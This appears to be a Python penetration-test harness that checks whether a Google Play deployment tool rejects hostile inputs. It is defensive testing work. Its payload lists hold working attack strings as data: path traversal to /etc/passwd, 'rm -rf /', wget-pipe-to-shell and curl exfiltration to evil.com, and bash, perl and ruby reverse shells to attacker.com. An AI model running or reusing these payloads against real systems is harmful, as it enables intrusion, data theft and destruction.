#!/usr/bin/env python3
"""
BATTLE TEST ROUND 1: Penetration Testing & Vulnerability Discovery
Attack vectors: Path traversal, injection, authentication bypass, input fuzzing
"""

import sys
import os
import json
import time
import random
import string
import asyncio
import hashlib
import hmac
import base64
from pathlib import Path

# Add parent to path
sys.path.insert(0, str(Path(__file__).parent.parent))

class AttackSimulator:
    """Simulates various attacks on the deployment system"""
    
    def __init__(self):
        self.findings = []
        self.total_tests = 0
        self.passed_tests = 0
        
    def log_finding(self, severity, category, description, payload=None):
        """Log a security finding"""
        self.findings.append({
            'severity': severity,
            'category': category,
            'description': description,
            'payload': payload,
            'timestamp': time.time()
        })
        print(f"  [!] {severity}: {description}")
        if payload:
            print(f"      Payload: {payload[:100]}...")
    
    def test_path_traversal(self):
        """Test path traversal vulnerabilities"""
        print("\n[+] Testing Path Traversal...")
        
        from google_play_deployment import InputValidator
        
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/etc/passwd",
            "\\windows\\system32\\config\\sam",
            "~/../../../etc/passwd",
            "artifacts/../../../etc/passwd",
            "build/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "releases/..\\..\\..\\windows\\system.ini",
            "dist/....\\....\\....\\windows\\win.ini",
            "output//../../..//etc/shadow",
            "artifacts\\..\\..\\..\\etc\\passwd",
            "build/../../../../../../../../etc/passwd",
            "releases/.%00./etc/passwd",  # Null byte injection attempt
            "dist/..%00../etc/passwd",
        ]
        
        for path in malicious_paths:
            self.total_tests += 1
            try:
                result = InputValidator.validate_path(path, must_exist=False)
                self.log_finding(
                    'CRITICAL', 
                    'Path Traversal', 
                    f'Path traversal NOT blocked: {path}',
                    path
                )
            except (ValueError, FileNotFoundError):
                self.passed_tests += 1
                
    def test_command_injection(self):
        """Test command injection vulnerabilities"""
        print("\n[+] Testing Command Injection...")
        
        from google_play_deployment import InputValidator
        
        malicious_inputs = [
            "; rm -rf /",
            "&& cat /etc/passwd",
            "|| echo hacked",
            "`whoami`",
            "$(cat /etc/passwd)",
            "| nc attacker.com 4444",
            "; python -c 'import os; os.system(\"id\")'",
            "&& wget http://evil.com/shell.sh | sh",
            "|| curl -d @/etc/passwd http://evil.com",
            "`python3 -c 'import socket,subprocess,os;s=socket.socket();s.bind((\"\",9999));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call([\"/bin/sh\"])'`",
            "; exec bash -i >& /dev/tcp/attacker.com/4444 0>&1",
            "&& /bin/sh -i",
            "| /bin/bash",
            "; powershell -Command \"Invoke-WebRequest -Uri http://evil.com\"",
            "&& cmd.exe /c dir",
            "|| system('id')",
            "`perl -e 'use Socket;$i=\"attacker.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'`",
            "; ruby -rsocket -e'f=TCPSocket.open(\"attacker.com\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        ]
        
        for payload in malicious_inputs:
            self.total_tests += 1
            try:
                result = InputValidator.sanitize_string(payload)
                self.log_finding(
                    'CRITICAL',
                    'Command Injection',
                    f'Command injection NOT blocked: {payload[:50]}',
                    payload
                )
            except ValueError:
                self.passed_tests += 1
                
    def test_input_length_limits(self):
        """Test input length boundary conditions"""
        print("\n[+] Testing Input Length Limits...")
        
        from google_play_deployment import InputValidator
        
        # Test max length boundaries
        test_cases = [
            ('a' * 255, True),   # Should pass (at limit)
            ('a' * 256, False),  # Should fail (over limit)
            ('a' * 1000, False), # Should fail
            ('a' * 10000, False),# Should fail
        ]
        
        for input_str, should_pass in test_cases:
            self.total_tests += 1
            try:
                result = InputValidator.sanitize_string(input_str)
                if not should_pass:
                    self.log_finding(
                        'HIGH',
                        'Input Validation',
                        f'Over-long input accepted: {len(input_str)} chars'
                    )
                else:
                    self.passed_tests += 1
            except ValueError:
                if should_pass:
                    self.log_finding(
                        'MEDIUM',
                        'Input Validation',
                        f'Valid input rejected: {len(input_str)} chars'
                    )
                else:
                    self.passed_tests += 1
                    
    def test_race_conditions(self):
        """Test for race conditions in deployment tracking"""
        print("\n[+] Testing Race Conditions...")
        
        from google_play_deployment import DeploymentManager, Track
        
        async def concurrent_deployments():
            """Simulate concurrent deployments"""
            manager = DeploymentManager()
            
            async def deploy_task(i):
                try:
                    # Note: This will fail due to missing AAB, but we're testing the locking
                    await manager.deploy(
                        "artifacts/test.aab",
                        Track.INTERNAL.value,
                        f"Test {i}"
                    )
                except Exception as e:
                    pass
            
            # Launch many concurrent tasks
            tasks = [deploy_task(i) for i in range(100)]
            await asyncio.gather(*tasks, return_exceptions=True)
            
            # Check deployment count
            deployments = manager.list_deployments()
            return len(deployments)
        
        try:
            count = asyncio.run(concurrent_deployments())
            self.total_tests += 1
            if count == 100:
                self.passed_tests += 1
                print(f"  [✓] Race condition test passed: {count} deployments tracked")
            else:
                self.log_finding(
                    'HIGH',
                    'Race Condition',
                    f'Deployment count mismatch: expected 100, got {count}'
                )
        except Exception as e:
            self.log_finding(
                'MEDIUM',
                'Race Condition',
                f'Race condition test error: {e}'
            )
            
    def test_memory_exhaustion(self):
        """Test memory handling with large inputs"""
        print("\n[+] Testing Memory Exhaustion...")
        
        from google_play_deployment import InputValidator
        
        # Test with huge inputs
        huge_inputs = [
            'A' * (1024 * 1024),      # 1MB
            'A' * (10 * 1024 * 1024), # 10MB
            '\x00' * 1000000,         # Null bytes
        ]
        
        for i, huge_input in enumerate(huge_inputs):
            self.total_tests += 1
            try:
                start = time.time()
                result = InputValidator.sanitize_string(huge_input)
                elapsed = time.time() - start
                
                if elapsed > 1.0:  # Should be fast
                    self.log_finding(
                        'MEDIUM',
                        'Performance',
                        f'Slow processing of large input: {elapsed:.2f}s for {len(huge_input)} bytes'
                    )
                else:
                    self.passed_tests += 1
            except ValueError:
                self.passed_tests += 1  # Rejection is acceptable
            except MemoryError:
                self.log_finding(
                    'CRITICAL',
                    'Memory',
                    f'Memory error with input size: {len(huge_input)}'
                )
                
    def test_unicode_injection(self):
        """Test Unicode and encoding attacks"""
        print("\n[+] Testing Unicode/Encoding Attacks...")
        
        from google_play_deployment import InputValidator
        
        unicode_attacks = [
            "\u002e\u002e\u002f",  # Unicode dots and slash
            "\u002e\u002e\u005c",  # Unicode dots and backslash
            "..\x00/",  # Null byte
            "..%00/",
            "%c0%ae%c0%ae%c0%af",  # UTF-8 overlong encoding
            "%%32%65%%32%65%%32%66",  # Double encoding
            "%252e%252e%252f",
            "\x00",
            "\x00../../../etc/passwd",
            "artifacts\x00/../../../etc/passwd",
        ]
        
        for payload in unicode_attacks:
            self.total_tests += 1
            try:
                result = InputValidator.validate_path(payload, must_exist=False)
                self.log_finding(
                    'CRITICAL',
                    'Encoding',
                    f'Unicode attack NOT blocked',
                    payload
                )
            except (ValueError, FileNotFoundError):
                self.passed_tests += 1
                
    def test_aab_validation(self):
        """Test AAB file validation"""
        print("\n[+] Testing AAB Validation...")
        
        from google_play_deployment import AABValidator, InputValidator, SecurityConfig
        import zipfile
        
        # Create test directory structure within allowed paths
        test_dir = "build/test_aab_validation"
        os.makedirs(test_dir, exist_ok=True)
        
        try:
            # Valid ZIP (fake AAB) - create a proper minimal ZIP
            valid_aab = os.path.join(test_dir, "valid.aab")
            with zipfile.ZipFile(valid_aab, 'w') as zf:
                zf.writestr("base/manifest/AndroidManifest.xml", "<manifest></manifest>")
            
            # Invalid file
            invalid_aab = os.path.join(test_dir, "invalid.aab")
            with open(invalid_aab, 'wb') as f:
                f.write(b'NOTAZIP' + b'\x00' * 100)
            
            # Test valid file
            self.total_tests += 1
            result = AABValidator.validate_aab(valid_aab)
            if result.valid:
                self.passed_tests += 1
                print(f"  [✓] Valid AAB accepted")
            else:
                self.log_finding(
                    'MEDIUM',
                    'AAB Validation',
                    f'Valid AAB rejected: {result.errors}'
                )
            
            # Test invalid file
            self.total_tests += 1
            result = AABValidator.validate_aab(invalid_aab)
            if not result.valid:
                self.passed_tests += 1
                print(f"  [✓] Invalid AAB rejected")
            else:
                self.log_finding(
                    'CRITICAL',
                    'AAB Validation',
                    'Invalid AAB accepted'
                )
            
            # Test oversized file (create sparse file)
            oversized_aab = os.path.join(test_dir, "oversized.aab")
            with open(oversized_aab, 'wb') as f:
                f.write(b'PK\x03\x04')
                f.seek(200 * 1024 * 1024)  # 200MB sparse file
                f.write(b'\x00')
            
            self.total_tests += 1
            result = AABValidator.validate_aab(oversized_aab)
            if not result.valid:
                self.passed_tests += 1
                print(f"  [✓] Oversized AAB rejected")
            else:
                self.log_finding(
                    'CRITICAL',
                    'AAB Validation',
                    'Oversized AAB accepted'
                )
        finally:
            # Cleanup
            import shutil
            shutil.rmtree(test_dir, ignore_errors=True)
                
    def test_track_validation(self):
        """Test track name validation"""
        print("\n+] Testing Track Validation...")
        
        from google_play_deployment import InputValidator, Track
        
        valid_tracks = ['internal', 'alpha', 'beta', 'production', 'INTERNAL', 'Alpha']
        invalid_tracks = ['', 'invalid', 'master', 'dev', '../../etc/passwd', '; rm -rf /']
        
        for track in valid_tracks:
            self.total_tests += 1
            try:
                result = InputValidator.validate_track(track)
                self.passed_tests += 1
            except ValueError:
                self.log_finding(
                    'MEDIUM',
                    'Track Validation',
                    f'Valid track rejected: {track}'
                )
        
        for track in invalid_tracks:
            self.total_tests += 1
            try:
                result = InputValidator.validate_track(track)
                self.log_finding(
                    'HIGH',
                    'Track Validation',
                    f'Invalid track accepted: {track}'
                )
            except ValueError:
                self.passed_tests += 1
                
    def run_all_tests(self):
        """Run all penetration tests"""
        print("=" * 70)
        print("BATTLE TEST ROUND 1: Penetration Testing")
        print("=" * 70)
        
        self.test_path_traversal()
        self.test_command_injection()
        self.test_input_length_limits()
        self.test_race_conditions()
        self.test_memory_exhaustion()
        self.test_unicode_injection()
        self.test_aab_validation()
        self.test_track_validation()
        
        # Print summary
        print("\n" + "=" * 70)
        print("ROUND 1 SUMMARY")
        print("=" * 70)
        print(f"Total Tests: {self.total_tests}")
        print(f"Passed: {self.passed_tests}")
        print(f"Failed: {self.total_tests - self.passed_tests}")
        print(f"Success Rate: {self.passed_tests/self.total_tests*100:.1f}%")
        
        if self.findings:
            print(f"\n[!] FINDINGS: {len(self.findings)}")
            by_severity = {}
            for f in self.findings:
                by_severity[f['severity']] = by_severity.get(f['severity'], 0) + 1
            for sev, count in sorted(by_severity.items(), 
                                     key=lambda x: {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}[x[0]]):
                print(f"  {sev}: {count}")
        else:
            print("\n[✓] No critical findings!")
            
        return self.findings

if __name__ == "__main__":
    simulator = AttackSimulator()
    findings = simulator.run_all_tests()
    
    # Exit with error code if critical findings
    critical_count = sum(1 for f in findings if f['severity'] == 'CRITICAL')
    sys.exit(critical_count)
